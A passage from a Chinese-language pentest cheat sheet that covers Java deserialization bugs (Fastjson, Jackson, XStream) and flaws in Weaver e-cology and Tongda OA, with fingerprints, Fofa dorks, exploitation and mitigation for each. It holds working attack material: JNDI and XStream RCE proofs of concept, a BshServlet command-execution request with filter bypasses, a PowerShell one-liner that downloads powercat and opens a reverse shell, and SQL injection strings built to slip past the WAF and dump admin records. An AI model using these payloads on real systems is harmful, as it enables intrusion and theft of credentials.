<p>如何绕过高版本JDK的限制进行JNDI注入 – FreeBuf专栏·安全引擎
<a class="link" href="https://www.freebuf.com/column/207439.html"  target="_blank" rel="noopener"
    >https://www.freebuf.com/column/207439.html</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.如何查看服务器的jdk版本呢, 这里也有个小技巧</p>
<p><code>nc -lvvp 80#[marshalsec中指定的HTTP端口]</code></p>
<p>当服务器连接过来时, <code>User-Agent</code>中会标明当前服务器的JDK版本</p>
<p>2.当发现一台Redis的数据中有@type字样时, 意味着autotype大概率是开的, 只要不存在黑名单中的利用链都可以用#[同理可以用在jackson上]</p>
<p>fastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjson
<a class="link" href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java"  target="_blank" rel="noopener"
    >https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public class GenericFastJsonRedisSerializer implements RedisSerializer&lt;Object&gt; {
</span></span><span class="line"><span class="cl">private final static ParserConfig defaultRedisConfig = new ParserConfig();
</span></span><span class="line"><span class="cl">static { defaultRedisConfig.setAutoTypeSupport(true);}
</span></span></code></pre></td></tr></table>
</div>
</div><p>其他消息队列之类的都是同理</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级Fastjson到最新版(&gt;=1.2.68 新增了safemode, 彻底关闭autotype)
2.WAF拦截过滤请求包中的 <code>@type</code>, <code>%u0040%u0074%u0079%u0070%u0065</code>, <code>\u0040type</code>, <code>\x04type</code> 等多种编码的autotype变形</p>
<p>3.最少升级到1.2.48以上版本且关闭autotype选项</p>
<p>4.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p>
<h2 id="jackson-反序列化远程代码执行漏洞">Jackson 反序列化远程代码执行漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Jackson 跟Fastjson一样, 当enableDefaultTyping开启时, 也是可以进行反序列化到代码执行</p>
<p><strong>2. 影响组件</strong>
Jackson</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)
<a class="link" href="https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/"  target="_blank" rel="noopener"
    >https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/</a></p>
<p><strong>4. Fofa Dork</strong></p>
<p><strong>5. 漏洞分析</strong></p>
<p>跟Fastjson漏洞原理都是一样的, 每次修复基本都是更新黑名单, 漏洞分析可以参考</p>
<p>Jackson-databind-2670远程代码执行漏洞简单分析 – 先知社区
<a class="link" href="https://xz.aliyun.com/t/7506"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/7506</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>learnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabug
<a class="link" href="https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson"  target="_blank" rel="noopener"
    >https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson</a></p>
<p>POC</p>
<p><code>[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;, {&quot;jndiLocation&quot;:&quot;ldap://localhost:43658/Calc&quot;}]</code></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.把Fastjson的利用链拿过来改一改就可以用, 前提是环境中存在可用的利用链</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级Jackson到最新版(enableDefaultTyping默认都是关的, 问题不大)</p>
<p>2.确保enableDefaultTyping是关闭的</p>
<p>3.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p>
<h2 id="xstream-反序列化漏洞">Xstream 反序列化漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Xstream Java 中经常用于处理 xml 的库, 最近一次修复中(1.4.10版本)重现了历史反序列化远程代码执行漏洞, 所以也需要关注</p>
<p><strong>2. 影响组件</strong></p>
<p>Xstream &lt;1.4.6, =1.4.10</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>xml</p>
<p><strong>4. Fofa Dork</strong></p>
<p><strong>5. 漏洞分析</strong></p>
<p>XStream反序列化组件攻击分析 | angelwhu_blog
<a class="link" href="https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins%EF%BF%A5%EF%BE%88%EF%BE%A9%EF%BF%A7%EF%BE%94%EF%BE%A8"  target="_blank" rel="noopener"
    >https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ</a></p>
<p><strong>6. 漏洞利用</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import com.thoughtworks.xstream.XStream;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import java.io.IOException;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">public class Main {
</span></span><span class="line"><span class="cl">// POC1
</span></span><span class="line"><span class="cl">    public static void main(String[] args) throws IOException {
</span></span><span class="line"><span class="cl">            XStream xStream = new XStream();
</span></span><span class="line"><span class="cl">            String payload = &#34;&lt;sorted-set&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;    &lt;string&gt;foo&lt;/string&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;    &lt;dynamic-proxy&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;        &lt;handler class=\&#34;java.beans.EventHandler\&#34;&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;            &lt;target class=\&#34;java.lang.ProcessBuilder\&#34;&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;                &lt;command&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;                    &lt;string&gt;cmd.exe&lt;/string&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;                    &lt;string&gt;/c&lt;/string&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;                    &lt;string&gt;calc&lt;/string&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;                &lt;/command&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;            &lt;/target&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;     &lt;action&gt;start&lt;/action&gt;&#34;+
</span></span><span class="line"><span class="cl">                    &#34;        &lt;/handler&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;    &lt;/dynamic-proxy&gt;\n&#34; +
</span></span><span class="line"><span class="cl">                    &#34;&lt;/sorted-set&gt;\n&#34;;
</span></span><span class="line"><span class="cl">//POC2
</span></span><span class="line"><span class="cl">//        String payload = &#34;&lt;java.util.PriorityQueue serialization=\&#34;custom\&#34;&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;  &lt;unserializable-parents/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;  &lt;java.util.PriorityQueue&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;    &lt;default&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;      &lt;size&gt;2&lt;/size&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;      &lt;comparator class=\&#34;org.apache.commons.beanutils.BeanComparator\&#34;&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;        &lt;property&gt;databaseMetaData&lt;/property&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;        &lt;comparator class=\&#34;java.util.Collections$ReverseComparator\&#34;/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;      &lt;/comparator&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;    &lt;/default&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;    &lt;int&gt;3&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;    &lt;com.sun.rowset.JdbcRowSetImpl serialization=\&#34;custom\&#34;&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;      &lt;javax.sql.rowset.BaseRowSet&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;        &lt;default&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;isolation&gt;2&lt;/isolation&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;maxRows&gt;0&lt;/maxRows&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;readOnly&gt;true&lt;/readOnly&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;dataSource&gt;ldap://ip:1389/Object&lt;/dataSource&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;params/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;        &lt;/default&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;      &lt;/javax.sql.rowset.BaseRowSet&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;        &lt;default&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;iMatchColumns&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;int&gt;-1&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;int&gt;-1&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;int&gt;-1&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;int&gt;-1&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;int&gt;-1&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;int&gt;-1&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;int&gt;-1&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;int&gt;-1&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;int&gt;-1&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;int&gt;-1&lt;/int&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;/iMatchColumns&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;strMatchColumns&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;string&gt;foo&lt;/string&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;null/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;null/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;null/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;null/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;null/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;null/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;null/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;null/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;            &lt;null/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;          &lt;/strMatchColumns&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;        &lt;/default&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;    &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;    &lt;com.sun.rowset.JdbcRowSetImpl reference=\&#34;../com.sun.rowset.JdbcRowSetImpl\&#34;/&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;  &lt;/java.util.PriorityQueue&gt;\n&#34; +
</span></span><span class="line"><span class="cl">//                &#34;&lt;/java.util.PriorityQueue&gt;&#34;;
</span></span><span class="line"><span class="cl">        xStream.fromXML(payload);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>7. 利用技巧</strong></p>
<p>1.这里 <code>Xstream</code> 同样影响很多使用它的开源组件, 比如<code>Spring</code>系列</p>
<p>Maven Repository: com.thoughtworks.xstream » xstream » 1.4.10 (Usages)
<a class="link" href="https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages"  target="_blank" rel="noopener"
    >https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages</a></p>
<p>2.xml 不仅可以xxe, 还能反序列化代码执行</p>
<p>2.xxe 漏洞用 <code>xxer</code>, 方便快捷</p>
<p>TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab.
<a class="link" href="https://github.com/TheTwitchy/xxer"  target="_blank" rel="noopener"
    >https://github.com/TheTwitchy/xxer</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<h2 id="泛微oa-bsh-远程代码执行漏洞">泛微OA Bsh 远程代码执行漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p>
<p><strong>2. 影响组件</strong>
泛微OA</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Set-Cookie: ecology_JSessionId=</code></p>
<p><code>ecology</code></p>
<p><code>/weaver/bsh.servlet.BshServlet</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;泛微-协同办公OA&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>泛微OA E-cology远程代码执行漏洞原理分析 – FreeBuf互联网安全新媒体平台
<a class="link" href="https://www.freebuf.com/vuls/215218.html"  target="_blank" rel="noopener"
    >https://www.freebuf.com/vuls/215218.html</a></p>
<p><a class="link" href="https://github.com/beanshell/beanshell"  target="_blank" rel="noopener"
    >https://github.com/beanshell/beanshell</a></p>
<p><a class="link" href="http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI"  target="_blank" rel="noopener"
    >http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Vulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysis
<a class="link" href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204"  target="_blank" rel="noopener"
    >https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /weaver/bsh.servlet.BshServlet HTTP/1.1
</span></span><span class="line"><span class="cl">Host: xxxxxxxx:8088
</span></span><span class="line"><span class="cl">Accept: */*
</span></span><span class="line"><span class="cl">Accept-Language: en
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">Content-Length: 98
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bsh.script=eval%00(&#34;ex&#34;%2b&#34;ec(\&#34;whoami\&#34;)&#34;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>7. 利用技巧</strong></p>
<p>1.其他形式绕过</p>
<p><code>eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);</code> 也可以换成 <code>ex\u0065c(&quot;cmd /c dir&quot;);</code></p>
<p>2.泛微多数都是windows环境, 反弹shell可以使用pcat</p>
<p><code>powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新泛微补丁</p>
<p>2.拦截<code>/weaver/bsh.servlet.BshServlet</code>目录的访问</p>
<h2 id="泛微oa-e-cology-sql注入漏洞">泛微OA e-cology SQL注入漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC <a class="link" href="https://weaversrc.vulbox.com/"  target="_blank" rel="noopener"
    >https://weaversrc.vulbox.com/</a>, 情况有所好转</p>
<p><strong>2. 影响组件</strong></p>
<p>泛微OA</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Set-Cookie: ecology_JSessionId=</code></p>
<p><code>ecology</code></p>
<p><code>WorkflowCenterTreeData</code></p>
<p><code>/mobile/plugin/SyncUserInfo.jsp</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;泛微-协同办公OA&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区
<a class="link" href="https://xz.aliyun.com/t/6531"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/6531</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现<em>数据库</em>小龙人-CSDN博客
<a class="link" href="https://blog.csdn.net/zycdn/article/details/102494037"  target="_blank" rel="noopener"
    >https://blog.csdn.net/zycdn/article/details/102494037</a></p>
<p>Tentacle/ecology8_mobile_sql_inject.py at 6e1cecd52b10526c4851a26249339367101b3ca2 · orleven/Tentacle
<a class="link" href="https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py"  target="_blank" rel="noopener"
    >https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py</a></p>
<p>应用安全 – 软件漏洞 – 泛微OA漏洞汇总 – AdreamWillB – 博客园
<a class="link" href="https://www.cnblogs.com/AtesetEnginner/p/11558469.html"  target="_blank" rel="noopener"
    >https://www.cnblogs.com/AtesetEnginner/p/11558469.html</a></p>
<p><code>/mobile/plugin/SyncUserInfo.jsp</code> 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述</p>
<p><strong>7. 利用技巧</strong></p>
<p>1.在这个漏洞补丁之前大概有几十个前台注入, 都差不多, 因为没公开这里就不细说了</p>
<p>2.泛微的补丁中间改过一次过滤策略, 打完所有补丁的话, 注入就很难了</p>
<p>3.这里可以绕过的原因是泛微某个过滤器初始化错误, 当长度超过<code>xssMaxLength=500</code>的时候就不进入安全检测, 修复以后是<code>xssMaxLength=1000000</code>, 所以随便你填充<code>%0a%0d</code>还是<code>空格</code>都可以绕过注入检测</p>
<p>4.泛微后端数据库版本存在差异, 但是可以通用检测</p>
<p>已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致</p>
<p>所以这里筛选出一个相对通用的检测手法(下面代码是python的<code>&quot; &quot;*800</code> 800个空格)</p>
<p><code>&quot;-1) &quot;+&quot; &quot;*800+ &quot;union select/**/1, Null, Null, Null, Null, Null, Null, Null from Hrmresourcemanager where loginid=('sysadmin'&quot;</code></p>
<p>老版本可以在关键字后面加 <code>/**/</code> 来绕过sql检测</p>
<p>新版本可以通过加入大量空格/换行来绕过sql检测</p>
<p>mssql, oracle中都有<code>Hrmresourcemanager</code> , 这是管理员信息表</p>
<p>就<code>Hrmresource</code>表中没有用户, <code>Hrmresourcemanager</code> 表中也一定会存在<code>sysadmin</code>账户</p>
<p>所以进行<code>union select</code>的时候一定会有数据</p>
<p>这里也可以使用 <code>&quot;-1) &quot;+&quot; &quot;*800+ &quot; or/**/ 1=1 and id&lt;(5&quot;</code></p>
<p>这里使用 <code>&lt;5</code> 可以避免信息超过5条, 但是会返回密码等敏感信息, 不建议使用</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新泛微补丁
2.泛微最好不要开放到公网
3.使用waf拦击</p>
<h2 id="泛微oa-数据库泄露漏洞">泛微OA 数据库泄露漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC <a class="link" href="https://weaversrc.vulbox.com/"  target="_blank" rel="noopener"
    >https://weaversrc.vulbox.com/</a>, 情况有所好转</p>
<p><strong>2. 影响组件</strong></p>
<p>泛微OA</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Set-Cookie: ecology_JSessionId=</code></p>
<p><code>ecology</code></p>
<p><code>/mobile/DBconfigReader.jsp</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;泛微-协同办公OA&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>jas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞
<a class="link" href="https://github.com/jas502n/DBconfigReader"  target="_blank" rel="noopener"
    >https://github.com/jas502n/DBconfigReader</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>linbing/Weaver_Ecology_Oa_Config.py at master · taomujian/linbing
<a class="link" href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py"  target="_blank" rel="noopener"
    >https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.虽然是接口返回数据是加密的, 但是因为硬编码密钥的缘故, 解密也很简单, pydes就可以解密, 只是这里pydes本身有个bug, 修复方式 <code>pyDes.des(' ')</code>
2.这里解密出来的密码一般都是泛微默认的, 且数据库监听在127.0.0.1上, 用处看个人发挥了
3.此外泛微还有一些漏洞, 但是基本最新版都修复了, 由于没公开过, 就让他消失吧</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新泛微补丁</p>
<p>2.泛微最好不要开放到公网</p>
<p>3.使用waf拦截sql注入</p>
<h2 id="通达oa-远程代码执行漏洞">通达OA 远程代码执行漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>通达OA 在国内的用户也比较多, 虽说代码加了密, 奈何是Zend5.4, 解码很简单, 然后代码中的漏洞就很清楚, 尤其是变量覆盖和注入</p>
<p><strong>2. 影响组件</strong>
通达OA</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>&quot;/images/tongda.ico&quot;&gt;</code></p>
<p><code>Office Anywhere 20xx版 网络智能办公系统</code></p>
<p><code>/ispirit/interface/gateway.php</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;通达OA&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note
<a class="link" href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md"  target="_blank" rel="noopener"
    >https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p>
<p>代码审计 | 通达OA 任意用户登录漏洞（匿名RCE）分析 | zrools
<a class="link" href="https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/"  target="_blank" rel="noopener"
    >https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note
<a class="link" href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md"  target="_blank" rel="noopener"
